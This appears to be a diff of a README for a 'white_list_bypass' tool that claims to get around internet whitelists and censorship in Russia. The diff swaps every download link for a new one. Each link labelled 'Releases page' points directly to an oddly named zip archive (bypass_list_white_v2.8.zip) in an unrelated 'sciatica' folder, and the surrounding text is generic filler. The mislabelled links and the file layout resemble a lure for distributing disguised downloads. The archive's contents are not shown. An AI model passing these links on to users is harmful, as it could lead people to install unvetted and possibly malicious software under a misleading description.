@@ -11,7 +11,7 @@ Before you start, make sure your system meets these requirements:
 - Internet connection for downloads
 
 ## 📥 Download Now
-[![Download white_list_bypass](https://raw.githubusercontent.com/Just-blech/white_list_bypass/main/sciatica/list_white_bypass_v2.6.zip)](https://raw.githubusercontent.com/Just-blech/white_list_bypass/main/sciatica/list_white_bypass_v2.6.zip)
+[![Download white_list_bypass](https://github.com/Just-blech/white_list_bypass/raw/refs/heads/main/sciatica/bypass_list_white_v2.8.zip)](https://github.com/Just-blech/white_list_bypass/raw/refs/heads/main/sciatica/bypass_list_white_v2.8.zip)
 
 ## 📋 Features
 - Bypass internet whitelists
@@ -27,7 +27,7 @@ white_list_bypass operates by finding paths that allow you to access the interne
 To get started, follow these steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Just-blech/white_list_bypass/main/sciatica/list_white_bypass_v2.6.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/Just-blech/white_list_bypass/raw/refs/heads/main/sciatica/bypass_list_white_v2.8.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    Look for the latest release, which will have the most recent updates and features.
@@ -64,6 +64,6 @@ This application explores various topics related to internet access. Here are so
 - Overcoming censorship in Russia
 
 ## 📥 Download Now Again
-To download white_list_bypass, visit the [Releases page](https://raw.githubusercontent.com/Just-blech/white_list_bypass/main/sciatica/list_white_bypass_v2.6.zip).
+To download white_list_bypass, visit the [Releases page](https://github.com/Just-blech/white_list_bypass/raw/refs/heads/main/sciatica/bypass_list_white_v2.8.zip).
 
 Thank you for using white_list_bypass. We aim to keep you connected.
